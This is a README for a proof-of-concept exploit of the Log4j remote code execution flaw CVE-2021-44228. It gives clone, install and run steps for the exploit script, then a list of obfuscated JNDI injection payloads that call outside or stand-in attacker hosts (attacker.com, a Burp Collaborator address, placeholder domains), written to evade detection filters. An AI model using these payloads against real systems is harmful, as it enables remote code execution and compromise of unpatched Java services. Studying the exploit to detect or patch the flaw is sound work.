# CVE-2021-44228 – Log4j RCE Unauthenticated

## About

This is a proof-of-concept exploit for Log4j RCE Unauthenticated (CVE-2021-44228).

This vulnerability [`affects versions < 2.15.0`](https://logging.apache.org/log4j/2.x/security.html).

For more information:

https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j

## Contributors

[@pedrohavay](https://twitter.com/pedrohavay)

# Disclaimer

This project is created only for **educational purposes** and cannot be used for law violation or personal gain.

The author of this project is not responsible for any possible harm caused by the materials of this project.

# Demo

![image](demo.gif)

# Installation

    git clone https://github.com/pedrohavay/exploit-CVE-2021-44228
    cd exploit-CVE-2021-44228
    pip install -r requirements.txt

# Usage

1. Use the script

        python3 main.py

# Payloads

    ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
    ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
    ${jndi:rmi://adsasd.asdasd.asdasd}
    ${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
    ${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
    ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
    ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
    ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
    ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
    ${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://localhost:12345/Exploit}

# Requirements

- Python 3
- Java (JDK)
